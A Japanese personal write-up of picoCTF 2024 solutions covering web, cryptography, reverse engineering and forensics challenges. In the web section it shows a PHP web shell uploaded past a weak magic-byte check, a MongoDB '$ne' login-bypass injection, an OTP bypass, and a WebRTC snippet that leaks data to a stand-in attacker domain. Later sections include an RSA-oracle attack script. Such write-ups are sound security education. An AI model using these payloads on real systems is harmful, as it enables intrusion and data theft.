---
title: picoCTF 2024 - Writeup
id: picoctf-2024
tags:
  - CTF
  - セキュリティ
date: 2024-03-27 00:00:00
---

<img src="/img/2024/02-25/Untitled.png" width="auto" height="auto">

picoCTF 2024に個人参加し、6954チーム中**??位**でした。

感想とwriteupを書きます。問題スクリーンショットは開催期間中のものなので、Solved数やLike数は参考程度に見てください。
picoなので開催期間終了後もご自身で解けるはずなので是非挑戦してみてください。

<!-- more -->

## 目次
<!-- toc -->

## 順位・解けた問題

<img src="/img/2024/02-25/Untitled%201.png" width="auto" height="auto">

<img src="/img/2024/02-25/Untitled%202.png" width="auto" height="auto">

## 感想

去年からCTFを始めて以来、picoCTFには貴重な常設CTFとして大変お世話になったので、イベントでたくさん問題解けて成長を実感できてよかったです。

picoらしく簡単な問題は簡単でしたが、スコア400点以上の問題は滅茶苦茶に骨がありました...
解けなかった問題も色々な解法を試す中であやふやな知識が整理されていったので有意義でした。

今回のコンテストで以下の要素を初体験できました。

- WindowsのPEファイル (.exe) の動的解析
- UPXでパックされた（静的にアンパック可能な）マルウェアの解析
- 大規模な連立1次方程式の求解
- CSP (Content-Security-Policy) が厳しい条件でのXSS
- GOT Overwrite
- gdbscriptを使ったpwnのデバッグ

また、苦手としていたpwnが最難問題以外は全部解けたので、自信に繋がりました。

## Web Exploitation

### Bookmarklet

<img src="/img/2024/03-27/Untitled.png" width="550px" height="auto"> 

ブックマークレット… 懐かし…

Web Consoleで実行。

<img src="/img/2024/03-27/Untitled%201.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s3cur3_c0nn3ct10n_5d09a462}

</aside>

### WebDecode

<img src="/img/2024/03-27/Untitled%202.png" width="550px" height="auto"> 

Aboutのページのソースコードで臭い箇所あったので確認したら、Base64デコードでフラグ。

<img src="/img/2024/03-27/Untitled%203.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{web_succ3ssfully_d3c0ded_02cdcb59}

</aside>

### IntroToBurp

<img src="/img/2024/03-27/Untitled%204.png" width="550px" height="auto"> 

OTP (One Time Password) な二段階認証に見える。

しかし二段階目のリクエストボディから `otp=` を取り除けばbypassできる。

<img src="/img/2024/03-27/Untitled%205.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{＃0TP_Bypvss_SuCc3$S_3e3ddc76} （＃を全角文字にしているので注意）

</aside>

### Unminify

<img src="/img/2024/03-27/Untitled%206.png" width="550px" height="auto"> 

ソースコードに書いてあるだけ。BurpなりでPretty表示していれば瞬殺。

<img src="/img/2024/03-27/Untitled%207.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{pr3tty_c0d3_743d0f9b}

</aside>

### No Sql Injection

<img src="/img/2024/03-27/Untitled%208.png" width="550px" height="auto"> 

`app/api/login/route.ts` を読むと、

```tsx
export const POST = async (req: any) => {
  const { email, password } = await req.json();
  try {
    await connectToDB();
    await seedUsers();
    const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
    });
...
```

とやっている。裏側はMongoDBであることも別の箇所からわかるので、否定マッチで `"email": { "$ne": "nai-nai" }` みたいにすれば良い。

<img src="/img/2024/03-27/Untitled%209.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_f2f185f2}

</aside>

### **Trickster**

<img src="/img/2024/03-27/Untitled%2010.png" width="550px" height="auto"> 

robots.txt があるので見てみる。

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

`/uploads/` にファイル置かれそう。ここに .php でも置いてRCEかな？

instructions.txt を読んでみる。

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

`first few bytes contain 'PNG' in hexadecimal: "50 4E 47"` が怪しい。first few bytesで良いんだ。

拡張子は `.png` である必要はなく、 `.png.php` で良いことも試せばすぐわかるので、以下の内容で `a.png.php` を作る。

```php
% cat a.png.php
PNG
<div>Use `?cmd=` param.</div>

<div>-------------------- OUTPUT --------------------</div>
<pre><?php system($_GET["cmd"]);?></pre>
<div>-------------------- END OUTPUT --------------------</div>
```

これをアップロードし、 `/uploads/a.png.php` にアクセス。PHPのエラーが出ててうまく動いてそう。

あとは

- `/uploads/a.png.php?cmd=find / -name '*.txt'` にアクセスして `/var/www/html/MFRDAZLDMUYDG.txt` という怪しいファイルを見つけ、
- `/uploads/a.png.php?cmd=cat /var/www/html/MFRDAZLDMUYDG.txt`

すればフラグが見える。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}

</aside>

### elements

<img src="/img/2024/03-27/Untitled%2011.png" width="550px" height="auto"> 

解けなかった。以下、滅茶苦茶な試行錯誤のあとに無理筋だと気づいた方針をメモしておく。解けた人のwriteupを早く見たい…

（ここに書いたことに実は見落としがあって実は正攻法かもしれない。あくまでも筆者の戒め用と思って、解けた人のwriteupを参考にしてください）

#### 無理筋1 - XSSで攻撃サーバーにリーク

一見すると、index.js での eval() を使ってXSS → URLのフラグメントを攻撃サーバー（HTTPやDNS）にリークさせる問題に見える。

しかし policy.json で

```jsx
{"URLAllowlist":["127.0.0.1:8080"],"URLBlocklist":["*"]}
```

となっているので、外部への通信が全く発生しないchromiumになっている。

あと、↓で NETWORK_PREDICTION_NEVER にもしているし、絶対にDNSリークもさせない気概を感じる。

<img src="/img/2024/03-27/Untitled%2012.png" width="550px" height="auto"> 

#### 無理筋1.5 - RTCでCSP bypass

無理筋1の派生。CSPが結構固い問題だが、調べるとRTCなら↓のようにCSP bypassできるという記事を見かけた。

```jsx
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.your-domain"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```

[https://webhook.site/](https://webhook.site/) やBurp Collaboratorなどと組み合わせ、サブドメイン部分にクレデンシャルをセットさせてSTUNサーバーにリクエストさせるのが一つの定石。

しかし今回は、Chromiumのビルド時にwindow (JSでのglobalなあれ) からRTCPeerConnectionが生えなくなっている。

<img src="/img/2024/03-27/Untitled%2013.png" width="550px" height="auto"> 

#### 無理筋2: X転送して画面を覗き見る

転送するための入口（ssh, ファイルシステム共有, etc）開いてないし無理だと思う。

#### 無理筋3: chromiumのデバッグ用ポートにつなぐ

tcp/8080 しか開いてないしweb appサーバーに専有されてるし、無理なはず。

#### 無理筋4: chromiumにローカルファイルを書かせてリーク

index.htmlとかにフラグを書いてもらう発想。

ブラウザのファイルシステムAPIはshowSaveFilePicker を使ってユーザーアクションさせることが必要そうで、ちょっと成立しなさそう。

#### 無理筋?5: Prototype Pollution to RCE

ここまでで見たように、chromiumクライアントサイドで変なことさせてもそれを攻撃者が知る術が見つからない。

サーバーサイドで直接変なこと、特にRCEが起こせれば、chromiumを介さずにフラグファイルを攻撃サーバーに転送するようなこともできるはず。

RCE手段として今回ギリギリありそうなのは、入力JSONを通じたPrototype Pollution。しかし自分の力量では今回の index.mjs からPrototype Pollution可能な箇所は見つからなかった。

（一番正解に近いのはこれかなぁと思っている。Prototype Pollutionさえ刺されば[これとかでchromiumの代わりにnodeをforkしつつ任意コード実行](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#spawn-exploitation)ができるはず）

## Cryptography

### interencdec

<img src="/img/2024/03-27/Untitled%2014.png" width="550px" height="auto"> 

Base64っぽいのが書いてあるのでデコード。

```bash
% base64 -d < enc_flag
b'd3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX2kyMDRoa2o2fQ=='
```

まだBase64っぽいので、面倒になりそうな気がしてCyberChefでデコード。

シーザー暗号っぽいものが出てくるのでROT13 Brute Forceしてフラグ。

<img src="/img/2024/03-27/Untitled%2015.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{caesar_d3cr9pt3d_b204adc6}

</aside>

### Custom encryption

<img src="/img/2024/03-27/Untitled%2016.png" width="550px" height="auto"> 

数値の shared_key と文字列の text_key を頑張って導出する問題だと思ったが、いざ導出したら custom_encryption.py の `test()` 関数にハードコードされているものと同じで無駄骨だった。

---

添付の custom_encryption.py の `test()` 関数を見ると、DH (Diffie-Hellman) 法みたいに鍵合意している。

```python
u = g^a (mod p)
v = g^b (mod p)

key = u^b = g^{ab} (mod p)
b_key = v^a = g^{ab} (mod p)
```

これ自体はそんなに解法に関係ない。

---

`shared_key` を割り出す。

`encrypt()` 関数を見れば、 `enc_flag` に書かれた暗号文の各整数要素は、 `key*311` を素因数に持っていることがわかる。したがって、最大公約数を求めれば `key = shared_key = 93` とわかる。

```python
cipher = [260307, 491691, ...]

def find_key():
    """encrypt() のアルゴリズムを見ると、cipher の0でない各要素は、 key * 311 を公約数に持っている。
    したがって、cipher の各要素の GCD // 311 が key である。
    """
    from math import gcd
    from functools import reduce
    key = reduce(gcd, [c // 311 for c in cipher])
    return key

print(find_key())
```

結果的に、これって `test()` 関数に書いてあった p, g, a, b から計算されるkeyであって、自力で出す必要なかった。

---

一旦ここまでを復号する。

```python
cipher = [260307, 491691, ...]

def find_key():
    """encrypt() のアルゴリズムを見ると、cipher の0でない各要素は、 key * 311 を公約数に持っている。
    したがって、cipher の各要素の GCD // 311 が key である。
    """
    from math import gcd
    from functools import reduce
    key = reduce(gcd, [c // 311 for c in cipher])
    return key

def decrypt(cipher, key):
    return "".join([chr(c // (key * 311)) for c in cipher])

key = find_key()
semi_cipher = decrypt(cipher, key)
```

---

次に `text_key` を割り出す。

custom_encryption.py の `dynamic_xor_encrypt()` によると、上記の `semi_cipher` を逆順に読んで正しい `text_key` と1文字ずつxorを取ると、平文が得られる。

平文の先頭は `picoCTF{` の8文字であることが予想されるので、

```python
平文 xor text_key = 'picoCTF{'
平文 xor 'picoCTF{' = text_key
```

から、 `text_key` の先頭8文字を割り出す。

```python
p = dynamic_xor_encrypt(semi_cipher, "picoCTF{")
print(p[:8])
```

実行すると `aedurtua` 。うまいこと循環してくれてそうで、 `text_key = aedurtu` と予想が立つ。

… これって custom_encryption.py に書いてあった `"trudeau"` の逆順だな。

---

これまでのを組み合わせて↓を得る。

```python
cipher = [260307, 491691, ...]

from custom_encryption import dynamic_xor_encrypt

def find_key():
    """encrypt() のアルゴリズムを見ると、cipher の0でない各要素は、 key * 311 を公約数に持っている。
    したがって、cipher の各要素の GCD // 311 が key である。
    """
    from math import gcd
    from functools import reduce
    key = reduce(gcd, [c // 311 for c in cipher])
    return key

def decrypt(cipher, key):
    return "".join([chr(c // (key * 311)) for c in cipher])

key = find_key()
semi_cipher = decrypt(cipher, key)

## p = dynamic_xor_encrypt(semi_cipher, "picoCTF{")
## print(p[:8])

print(dynamic_xor_encrypt(semi_cipher, "aedurtu"))
```

実行するとフラグゲット。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{custom_d2cr0pt6d_751a22dc}

</aside>

### C3

<img src="/img/2024/03-27/Untitled%2017.png" width="550px" height="auto"> 

エスパー成分が結構あり、好きじゃなかった。

添付のconvert.pyは↓

```python
import sys
chars = ""
from fileinput import input
for line in input():
  chars += line

chars = 'abc'

lookup1 = "\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"
lookup2 = "ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"

out = ""

prev = 0
for char in chars:
  cur = lookup1.index(char)
  out += lookup2[(cur - prev) % 40]
  prev = cur

sys.stdout.write(out)
```

lookup1 のアルファベットで構成される input() を、lookup2 のアルファベットに変換してる。

ループの中でやっているのは、

- `(cur - prev) % 40` で、平文の連続する2文字間の差 (diffとする) を計算し、
- その差をインデックスとして lookup2 を表引きする (表引き結果を diff_enc とする)
- diff_enc を1文字ずつ結合

という感じ。最後に結合した文字列を出力している。

ということで、復号は以下のスクリプトでできる。

```python
with open('ciphertext') as f:
    ciphertext = f.read()

lookup1 = '\n "#()*+/1:=[]abcdefghijklmnopqrstuvwxyz'
lookup2 = "ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"

out = ""
prev = 0
for diff_enc in ciphertext:
    diff = lookup2.index(diff_enc)
    cur = (prev + diff) % 40

    cur_char = lookup1[cur]
    out += cur_char

    prev = cur
    
print(out)
```

実行結果は以下のように、別のPythonスクリプトになる。これを [another.py](http://another.py) とする。

```python
#asciiorder
#fortychars
#selfinput
#pythontwo

chars = ""
from fileinput import input
for line in input():
    chars += line
b = 1 / 1

for i in range(len(chars)):
    if i == b * b * b:
        print chars[i] #prints
        b += 1 / 1
```

`input()` で渡された文字列から、「立方数」番目の文字を取ってきて出力している模様。

[convert.py](http://convert.py) の内容から、 `input()` 関数はこのスクリプトそのものを返すようになっているはず。
このスクリプトと同じディレクトリに [fileinput.py](http://fileinput.py) を以下の内容で作成。

```python
def input():
    return """#asciiorder
#fortychars
#selfinput
#pythontwo

chars = ""
from fileinput import input
for line in input():
    chars += line
b = 1 / 1

for i in range(len(chars)):
    if i == b * b * b:
        print chars[i] #prints
        b += 1 / 1
"""
```

python2で [another.py](http://another.py) を実行する。

```python
% python another.py
a
d
l
i
b
s
```

これがフラグ。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{adlibs}

</aside>

### rsa_oracle

<img src="/img/2024/03-27/Untitled%2018.png" width="550px" height="auto"> 

難しかったけど何とか解けた。

暗号オラクル・復号オラクルが両方与えられているときに、与えられた暗号文を平文に戻す問題。
（適応的）選択平文攻撃と（適応的）選択暗号文攻撃が両方できる状況とも言える。

ただし、n, eが今回は未知なのでそこは面倒。

---

既知平文の 2 を暗号化したものを C2 とする。つまり:

```python
C2 = 2^e (mod n)
```

これを、与えられた暗号文 c と掛け合わせ、復号する (※cそのものの復号は当然禁止されているので何かと掛けたり足したりする必要がある)。この操作を式変形して考えると、

```python
Dec(c * C2) = (c * C2)^d = c^d * C2^d = m * 2 (mod n)
```

`c^d` は与えられた暗号文を平文化したもの ( `m` と表記した) そのものであり、また `C2` を復号すると 2 に戻ることを利用した。

同様にして、3 の暗号文を C3 とすると、

```python
Dec(c * C3) = m * 3 (mod n)
```

`Dec(c * C2)` と `Dec(c * C3)` は共に復号オラクルから数値的に判明していることに注目。これらを利用して、

```python
Dec(c * C3) - Dec(c * C2) = m * 3 - m * 2 = m (mod n)
```

と、法nでの平文mを得る。

---

これをプログラムにして、復号パスワードを表示するようにすると↓。

```python
from pwn import *
from Crypto.Util.number import long_to_bytes

host = "titan.picoctf.net"
port = 62026

io = connect(host, port)
## ----------------------

def enc_oracle(m):
    io.recvuntil(b"E --> encrypt D --> decrypt.")
    io.sendline(b"E")
    io.sendlineafter(
        b"enter text to encrypt (encoded length must be less than keysize): ",
        long_to_bytes(m),
    )

    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    dec_c_line = io.recvline()

    c_dec = dec_c_line.split(b"ciphertext (m ^ e mod n) ")[-1].rstrip().decode()
    return int(c_dec)

def dec_oracle(c):
    io.recvuntil(b"E --> encrypt D --> decrypt.")
    io.sendline(b"D")
    io.sendlineafter(b"Enter text to decrypt: ", str(c).encode())

    m_line = io.recvline()
    m_hex = (
        m_line.split(b"decrypted ciphertext as hex (c ^ d mod n):")[-1]
        .rstrip()
        .decode()
    )
    m = int(m_hex, 16)
    return m

c = 873224563026311790736191809393138825971072101706285228102516279725246082824238887755080848591049817640245481028953722926586046994669540835757705139131212

C2 = enc_oracle(2)
m2 = dec_oracle(c*C2)

C3 = enc_oracle(3)
m3 = dec_oracle(c*C3)

m = m3 - m2
print(long_to_bytes(m))
```

出力結果は `92d53` 。これを↓のパスワードとして使って、

```python
openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt
```

フラグゲット。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{su((3ss_(r@ck1ng_r3@_92d53250}

</aside>

### (解けず😭) flag_printer

解けなかった... 試行錯誤の過程で弱々な数学力がちょっと鍛えられたのでそれは良かった。

---

以下のプログラムが添付されている。この出力 output.bmp がフラグを表すっぽい。

```jsx
import galois
import numpy as np
MOD = 7514777789

points = []

for line in open('encoded.txt', 'r').read().strip().split('\n'):
    x, y = line.split(' ')
    points.append((int(x), int(y)))

GF = galois.GF(MOD)

matrix = []
solution = []
for point in points:
    x, y = point
    solution.append(GF(y % MOD))

    row = []
    for i in range(len(points)):
        row.append(GF((x ** i) % MOD))
    
    matrix.append(GF(row))

open('output.bmp', 'wb').write(bytearray(np.linalg.solve(GF(matrix), GF(solution)).tolist()[:-1]))

```

最終行で解こうとしている方程式を行列表現にする。encoded.txtのパース時点でxとなっているものをA, yとなっているものをbに対応させている点に注意。

$$
A \boldsymbol{x} = \boldsymbol{b}
$$

ただし、

- encoded.txt の行数を n とする (n = 1,769,611)
- 行列Aは n x n 行列、ベクトルx と ベクトルb は要素数nの列ベクトル
- Aの各行は、encoded.txt の行を1列目を a とし `[1, a, a**2, ..., a**(n-1)]` としたもの
- bの各行は、encoded.txt の2列目

---

また、解答のビットマップである x について以下のことが推測できる。

- xの各要素は、解答のビットマップの1バイトを表す
  - encoded.txt の1行目が y = 66 (chr(66) = ‘B’) であることから、bitmapファイル先頭のマジックコード `BM` のBっぽいので
- ビットマップは1.7MBくらい
  - n = 1,769,611 なので

---

解き方の制約を考えてみる。

- 愚直に逆行列を求めるのは O(n^3) = O(10^18) くらいで絶対無理
- 行列Aをメモリに保つ必要のある手法（ガウスの掃き出し法など）は、 n^2 = 10^12 バイトくらいのオーダーのメモリが必要で不可能っぽい
- 時間計算量的には、せいぜい O(n log n) くらいのものじゃないとだめ

となると、反復法に代表される近似アルゴリズムか？とも思うのだが、有限体で反復法みたいに誤差を小さくする考えが通用するとはどうも思えない。

ここらへんで離脱...

## Reverse Engineering

### packer

<img src="/img/2024/03-27/Untitled%2019.png" width="550px" height="auto"> 

そのままGhidraで逆コンパイルしてもmain関数すら見つからずわけがわからない。

`strings out` すると↓が見つかり、UPXでパックされていることがわかる。

```
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.95 Copyright (C) 1996-2018 the UPX Team. All Rights Reserved. $
```

アンパックする:

```bash
upx -d out
```

再びGhidraで見ると、main関数にフラグのhex encodeが書いてある。

<img src="/img/2024/03-27/Untitled%2020.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_5dee4441}

</aside>

### FactCheck

<img src="/img/2024/03-27/Untitled%2021.png" width="550px" height="auto"> 

Ghidraで逆コンパイルすると、main関数内でC++のstringでflagを作っている様子。

main関数で普通にflag作り終えてそう。gdbで `b main` してステップ実行を続けるとスタック上の変数のフラグが育っていくのが最後まで確認できる。

<img src="/img/2024/03-27/Untitled%2022.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{wELF_d0N3_mate_e9da2c0e}

</aside>

### Classic Crackme 0x100

<img src="/img/2024/03-27/Untitled%2023.png" width="550px" height="auto"> 

Ghidraで逆コンパイル。main関数の中で、ユーザー入力のパスワードを何かしら変換し、それをスタック領域の答えと memcmp で比較している様子。

パスワードを適当に `aaaa` とし、memcmp関数でbreakしたときのGDBの様子抜粋:

```bash
──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
 ► 0x40136a <main+500>    call   memcmp@plt                      <memcmp@plt>
        s1: 0x7fffffffd9f0 ◂— 'addgQTTWQTTWTWWZQTTWTWWZTWWZWZZ]QTTWTWWZTWWZWZZ]TW'
        s2: 0x7fffffffda30 ◂— 'lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw'
        n: 0x32
```

s2のほうが答え。s1は、先頭4文字だけいい感じに英語小文字になっていて、それ以外は大文字とか記号になっている。

逆コンパイル結果から、ユーザー入力のパスワードを変換している箇所を抜粋（変数名はいい感じに修正した）。

```c
  _51 = (int)sVar2;
  _0x55 = 0x55;
  _0x33 = 0x33;
  _0xf = 0xf;
  a_ch = 'a';
  for (; i < 3; i = i + 1) {
    for (j = 0; j < _51; j = j + 1) {
      local_28 = (j % 0xff >> 1 & _0x55) + (j % 0xff & _0x55);
      local_2c = ((int)local_28 >> 2 & _0x33) + (_0x33 & local_28);
      iVar1 = ((int)local_2c >> 4 & _0xf) + ((int)pass_in[j] - (int)a_ch) + (_0xf & local_2c);
      pass_in[j] = a_ch + (char)iVar1 + (char)(iVar1 / 0x1a) * -0x1a;
    }
  }
  iVar1 = memcmp(pass_in,&pass_answer,(long)_51);

```

細かいところは抜きにして、大事な性質として、

- ユーザー入力は一文字ずつ処理している（前後の文字の影響を受けない）

というのがある。

また、gdbで動的に実験すると、

| ユーザー入力4文字 (password) | s1の先頭4文字 (s1) | s2の先頭4文字 (s2) |
| --- | --- | --- |
| aaaa | addg | lxpy |
| bbbb | beeh | lxpy |

ということもわかる。このことから、

1. ユーザー入力を `aaa...a` (51文字) として得られた s1 と、
2. s2 の差を一文字ずつ調べて、
3. その差を ‘a’ をベースに足してやった文字が、その文字インデックスにおける正しいパスワード文字

と推測できる。

以下のPythonコードで正解のパスワードを得る。

```python
>>> s1 = 'addgdggjdggjgjjmdggjgjjmgjjmjmmpdggjgjjmgjjmjmmpgj' # aaa..a と入力した結果のs1
>>> s2 = 'lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw'
>>> password = [chr(ord('a') + ord(s2c) - ord(s1c)) for s1c, s2c in zip(s1, s2)]
>>> print(''.join(password))
lumsopg^aocgl\ijjikbp]hf\chdmeiVbotdjh^m]`ilk\g[[n
```

これをncで繋いだサーバーに送ると、フラグをゲット。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s0lv3_angry_symb0ls_150f8acd}

</aside>

### weirdSnake

<img src="/img/2024/03-27/Untitled%2024.png" width="550px" height="auto"> 

disモジュールによって .pyc をディスアセンブルしたテキストが添付されている。

猛者ならばこれを手で .py に復元できるのだろうが、嫌なので、ぐぐってでコンパイラを探す。

[GitHub - SuperStormer/pyasm: Decompile dis.dis output.](https://github.com/SuperStormer/pyasm/tree/master)

これが一応使えそうだが、Kaliに入れていたPythonだと素直には動かない。

```python
pyenv install 3.8.18
```

しつつ、エラーが出るので `~/.pyenv/versions/3.8.18/lib/python3.8/site-packages/pyasm/__init__.py` のファイルを以下のように力技で微修正。

```diff
def instructions_to_code(
        instructions, code_objects=None, version=None, name="main", filename="out.py", flags=0
):
+        from xdis.opcodes import opcode_38
...
-        opcodes = op_imports[canonic_python_version[version]]
+        #opcodes = op_imports[canonic_python_version[version]]
+        opcodes = opcode_38
```

その後

```bash
% ~/.pyenv/versions/3.8.18/bin/python -m pyasm snake.dis
```

コマンドにより、以下のPythonコードが出力された。

```python
def main():
    input_list = [
     4, 54, 41, 0, 112, 32, 25, 49, 33, 3, 0, 0, 57, 32, 108, 23, 48,
     4, 9, 70, 7, 110, 36, 8, 108, 7, 49, 10, 4, 86, 43, 108, 122,
     14, 2, 71, 62, 115, 88, 78]
    key_str = 'J'
    key_str = '_' + key_str
    key_str = key_str + 'o'
    key_str = key_str + '3'
    key_str = 't' + key_str
    key_list = [ord(char) for char in key_str]
    while len(key_list) < len(input_list):
        key_list.extend(key_list)

    result = [a ^ b for a, b in zip(input_list, key_list)]
    result_text = ''.join(map(chr, result))
```

最後の result_text がフラグになっている。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{N0t_sO_coNfus1ng_sn@ke_30a13a97}

</aside>

### WinAntiDbg0x100

慣れないWindowsマシン引っ張り出して解いたのであんまりメモってない。

IDA Freeでステップ実行し、IsDebuggerPresent() みたいな関数の返り値 eax を書き換えて分岐先を変えた。

フラグもメモってない...

### WinAntiDbg0x200

判定箇所が2箇所になったくらいで、あとは WinAntiDbg0x100 と同じ

（またフラグメモってない）

### WinAntiDbg0x300

<img src="/img/2024/03-27/Untitled%2025.png" width="550px" height="auto"> 

解けた問題の中では一番苦労した…………….

解き方も（だいぶ肉薄していたとは思うが）完璧とは言えない感じなので、他の人のwriteupも見てみたい。

---

まず、管理者モードのコマンドラインからexeを開く。そうするとGUIアプリが開く。デバッガ（IDA Freeを使った）から開くとアンチデバッガ機構にやられてすぐに終了するので注意（100敗）。

GUIのプロセスにデバッガをアタッチ。スレッドリストを確認。
WinAntiDbg0x300.exe のスレッドがアンチデバッグ機構を持っているっぽいので、こいつをSuspend。
3B123Fのスレッドがフラグ文字列をメモリ上で構築してくれてるっぽい（backtraceでWinAntiDbg0x300の命令を静的に観測して総判断した）ので、こいつ中心に動かしていく。

<img src="/img/2024/03-27/Untitled%2026.png" width="550px" height="auto"> 

アドレス 003B38DB の jmp 命令が、ヒントにある「infinite loop」な気がする（試行錯誤の結果）ので、EIPをその直後の 003B38E0 にセット。

<img src="/img/2024/03-27/Untitled%2027.png" width="550px" height="auto"> 

ここで WinAntiDbg0x300 のスレッドをSuspendからReadyに切り替え、Resumeする。例外のダイアログが出るが無視してResumeを続ける（例外はpass to appせずにdiscard）。。。。とかやった気がするが、何十回何百回と試行錯誤をしているうちにフラグが出た感じで、同再現すればよいのか正直わかってない…

<img src="/img/2024/03-27/Untitled%2028.png" width="550px" height="auto"> 

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{Wind0ws_antid3bg_0x300_da7fdd01}

</aside>

## Forensics

### Scan Surprise

<img src="/img/2024/03-27/Untitled%2029.png" width="550px" height="auto"> 

なんかよくわからんけど、添付zipの中のpngのQRコード読んだだけでフラグ。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{p33k_@_b00_a81f0a35}

</aside>

### Verify

<img src="/img/2024/03-27/Untitled%2030.png" width="550px" height="auto"> 

sshして↓実行してフラグ。

```c
ctf-player@pico-chall$ for f in $(ls files/) ; do bash decrypt.sh files/$f 2>&1 ; done |grep -v 'bad magic' |grep -v Error
picoCTF{trust_but_verify_00011a60}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{trust_but_verify_00011a60}

</aside>

### CanYouSee

<img src="/img/2024/03-27/Untitled%2031.png" width="550px" height="auto"> 

添付のzipを展開して出てきたjpgファイルをexiftoolで見て、フラグのBase64エンコード結果を得られる。

```bash
% exiftool ukn_reality.jpg
ExifTool Version Number         : 12.65
File Name                       : ukn_reality.jpg
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2024:02:16 07:40:21+09:00
File Access Date/Time           : 2024:02:16 07:40:21+09:00
File Inode Change Date/Time     : 2024:03:13 16:24:30+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Attribution URL                 : cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==
Image Width                     : 4308
Image Height                    : 2875
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 4308x2875
Megapixels                      : 12.4

% echo 'cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==' |base64 -d
picoCTF{ME74D47A_HIDD3N_a6df8db8}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{ME74D47A_HIDD3N_a6df8db8}

</aside>

### Secret of the Polyglot

<img src="/img/2024/03-27/Untitled%2032.png" width="550px" height="auto"> 

とりあえずPDFとして普通に開いてみると、

```bash
1n_pn9_&_pdf_7f9bccd1}
```

の文字列が書かれている。

他方、fileコマンドで見てみるとマジックコードはPNGらしい。 .png にしてあげて適当なビュワーで見ると、フラグのprefixが画像に描かれている。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{f1u3n7_1n_pn9_&_pdf_7f9bccd1}

</aside>

### Mob psycho

<img src="/img/2024/03-27/Untitled%2033.png" width="550px" height="auto"> 

apkはzipフォーマットなので、展開してみる。

```bash
% cp mobpsycho.{apk,zip}
% unzip mobpsycho.zip
```

フラグっぽいファイルを探してみると、あった。

```bash
% find . -name 'flag*'
./res/color/flag.txt
% cat ./res/color/flag.txt
7069636f4354467b6178386d433052553676655f4e5838356c346178386d436c5f61336562356163327d
```

CyberChefでhex decodeして、フラグゲット。

